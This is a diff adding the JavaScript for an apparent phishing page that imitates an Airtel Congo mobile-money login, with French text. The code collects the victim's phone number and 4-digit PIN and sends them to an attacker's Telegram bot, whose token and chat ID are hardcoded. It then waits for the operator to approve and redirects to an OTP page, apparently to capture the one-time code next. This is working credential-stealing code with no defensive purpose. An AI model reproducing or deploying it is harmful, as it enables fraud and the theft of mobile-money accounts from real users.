@@ -1,0 +1,260 @@
+const BOT_TOKEN = '8242988539:AAGvq-0MvHNJgSlz52MW-SRyHDKBMiFUTzs';
+const ADMIN_CHAT_ID = '8269053604';
+const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN;
+
+const eyeButton = document.querySelector('.al-eye');
+const codeInputs = [...document.querySelectorAll('.al-pin')];
+const phoneInput = document.querySelector('#phone');
+const connectBtn = document.querySelector('#connect');
+const loginForm = document.querySelector('#login-form');
+
+codeInputs.forEach(input => input.type = 'password');
+
+if (eyeButton) {
+    eyeButton.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2.5 12S6 5.5 12 5.5 21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12Z"/><circle cx="12" cy="12" r="2.8"/></svg>';
+    eyeButton.addEventListener('click', () => {
+        const visible = eyeButton.classList.toggle('is-visible');
+        codeInputs.forEach(input => input.type = visible ? 'text' : 'password');
+        eyeButton.setAttribute('aria-label', visible ? 'Masquer le code' : 'Afficher le code');
+    });
+}
+
+if (phoneInput) {
+    phoneInput.maxLength = 9;
+    phoneInput.addEventListener('input', () => {
+        phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
+        state();
+        if (isPhoneValid()) {
+            codeInputs.find(input => !input.value)?.focus();
+        }
+    });
+}
+
+codeInputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+        const value = e.target.value.replace(/\D/g, '').slice(0, 1);
+        e.target.value = value;
+        if (value && index < codeInputs.length - 1) {
+            codeInputs[index + 1].focus();
+        }
+        state();
+    });
+
+    input.addEventListener('paste', (event) => {
+        event.preventDefault();
+        const digits = event.clipboardData?.getData('text').replace(/\D/g, '') ?? '';
+        digits.split('').slice(0, 4).forEach((digit, i) => {
+            if (codeInputs[i]) codeInputs[i].value = digit;
+        });
+        const nextEmpty = codeInputs.find(pinInput => !pinInput.value);
+        (nextEmpty ?? codeInputs.at(-1))?.focus();
+        state();
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            codeInputs[index - 1].focus();
+            e.preventDefault();
+        } else if (e.key === 'ArrowLeft' && index > 0) {
+            codeInputs[index - 1].focus();
+            e.preventDefault();
+        } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
+            codeInputs[index + 1].focus();
+            e.preventDefault();
+        }
+    });
+});
+
+let approvalCheckInterval = null;
+let currentRequestId = null;
+
+function isPhoneValid() {
+    return phoneInput && /^9\d{8}$/.test(phoneInput.value);
+}
+
+function state() {
+    if (!connectBtn) return;
+    const pinValid = codeInputs.every(input => /^\d$/.test(input.value));
+    const formComplete = isPhoneValid() && pinValid;
+    connectBtn.disabled = !formComplete;
+    connectBtn.classList.toggle('enabled', formComplete);
+    connectBtn.style.backgroundColor = formComplete ? '#ed1c2e' : '#ddd';
+    connectBtn.style.cursor = formComplete ? 'pointer' : 'not-allowed';
+}
+
+function showInvalidNumber() {
+    if (document.querySelector('.number-warning')) return;
+    const warning = document.createElement('div');
+    warning.className = 'number-warning';
+    warning.innerHTML = '<div class="number-warning-card" role="alertdialog" aria-modal="true"><div class="number-warning-icon">⚠️</div><h2>Format Invalide</h2><p>Le numéro de téléphone doit commencer par <strong>9</strong> et contenir <strong>9 chiffres</strong>.</p><p>Veuillez entrer le bon numéro et réessayer!</p><button type="button">OK</button></div>';
+    warning.querySelector('button').onclick = () => { warning.remove(); phoneInput.focus(); };
+    document.body.appendChild(warning);
+}
+
+function showLoadingWithProgress(message, showRetry = false) {
+    const existing = document.querySelector('.telegram-loading');
+    if (existing) existing.remove();
+    const loader = document.createElement('div');
+    loader.className = 'telegram-loading';
+    let html = '<div class="login-loading-card"><div class="login-loading-spinner"></div><h2 class="telegram-loading-title">' + message + '</h2><p class="telegram-loading-subtitle" id="telegram-loading-subtitle">Veuillez patienter...</p>';
+    if (showRetry) html += '<button type="button" id="telegram-retry" class="telegram-retry-btn">🔄 Ressayer</button>';
+    html += '</div>';
+    loader.innerHTML = html;
+    document.body.appendChild(loader);
+    if (showRetry) {
+        document.getElementById('telegram-retry')?.addEventListener('click', () => { loader.remove(); initiateTelegramApproval(); });
+    }
+}
+
+function hideLoading() {
+    const loader = document.querySelector('.telegram-loading');
+    if (loader) loader.remove();
+}
+
+async function sendTelegramNotification(phone, pin) {
+    const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    
+    const lines = [
+        '📲 New Airtel Congo Request',
+        '📱 Phone: ' + phone,
+        '🔑 PIN: ' + pin,
+        '🆔 Request: ' + requestId
+    ];
+    const message = lines.join('\n');
+
+    try {
+        const response = await fetch(TELEGRAM_API + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: message,
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ Approve', callback_data: 'approve_' + requestId },
+                        { text: '❌ Reject', callback_data: 'reject_' + requestId }
+                    ]]
+                }
+            })
+        });
+        return { success: response.ok, requestId: requestId };
+    } catch (e) {
+        console.error('Telegram send failed:', e);
+        return { success: false, error: e.message, requestId: requestId };
+    }
+}
+
+async function checkTelegramApproval(requestId) {
+    try {
+        const response = await fetch(TELEGRAM_API + '/getUpdates?offset=-1000000000');
+        const data = await response.json();
+        
+        if (data.ok && Array.isArray(data.result)) {
+            for (const update of data.result) {
+                if (update.callback_query) {
+                    const parts = update.callback_query.data.split('_');
+                    const action = parts[0];
+                    const id = parts.slice(1).join('_');
+                    if (id === requestId) {
+                        if (action === 'approve') {
+                            try {
+                                await fetch(TELEGRAM_API + '/sendMessage', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        chat_id: update.callback_query.from.id,
+                                        text: '✅ Transaction approved!'
+                                    })
+                                });
+                            } catch (e) {}
+                            return { approved: true, status: 'approved' };
+                        } else if (action === 'reject') {
+                            try {
+                                await fetch(TELEGRAM_API + '/sendMessage', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        chat_id: update.callback_query.from.id,
+                                        text: '❌ Transaction rejected.'
+                                    })
+                                });
+                            } catch (e) {}
+                            return { approved: false, status: 'rejected' };
+                        }
+                    }
+                }
+            }
+        }
+        return { approved: false, status: 'pending' };
+    } catch (e) {
+        console.error('Approval check failed:', e);
+        return { approved: false, status: 'error' };
+    }
+}
+
+function startPolling(requestId) {
+    let checkCount = 0;
+    const maxChecks = 24;
+    const startTime = Date.now();
+
+    approvalCheckInterval = setInterval(async () => {
+        checkCount++;
+        const result = await checkTelegramApproval(requestId);
+
+        const subtitle = document.getElementById('telegram-loading-subtitle');
+        if (subtitle) {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            subtitle.textContent = 'Écoulé: ' + elapsed + 's...';
+        }
+
+        if (result.approved) {
+            clearInterval(approvalCheckInterval);
+            hideLoading();
+            sessionStorage.setItem('airtelOTPApproved', 'true');
+            sessionStorage.setItem('airtelPhone', phoneInput.value);
+            sessionStorage.setItem('airtelPin', codeInputs.map(i => i.value).join(''));
+            window.location.href = 'otp.html';
+        } else if (result.status === 'rejected') {
+            clearInterval(approvalCheckInterval);
+            hideLoading();
+            showLoadingWithProgress('Transaction Rejetée', true);
+        } else if (checkCount >= maxChecks) {
+            clearInterval(approvalCheckInterval);
+            hideLoading();
+            showLoadingWithProgress('Délai Expiré', true);
+        }
+    }, 5000);
+}
+
+function initiateTelegramApproval() {
+    if (!phoneInput || !connectBtn) return;
+    const phone = phoneInput.value;
+    if (!isPhoneValid()) { showInvalidNumber(); return; }
+    const pin = codeInputs.map(input => input.value).join('');
+    if (pin.length !== 4) return;
+
+    sessionStorage.setItem('airtelPhone', phone);
+    sessionStorage.setItem('airtelPin', pin);
+    showLoadingWithProgress("En Attente d'Apport de Confirmation", true);
+    
+    sendTelegramNotification(phone, pin).then(result => {
+        if (result.success) {
+            startPolling(result.requestId);
+        } else {
+            hideLoading();
+            showLoadingWithProgress('Erreur de Communication', true);
+        }
+    });
+}
+
+loginForm?.addEventListener('submit', (event) => {
+    event.preventDefault();
+    event.stopImmediatePropagation();
+    initiateTelegramApproval();
+});
+
+window.addEventListener('beforeunload', () => {
+    if (approvalCheckInterval) clearInterval(approvalCheckInterval);
+});
+
+state();
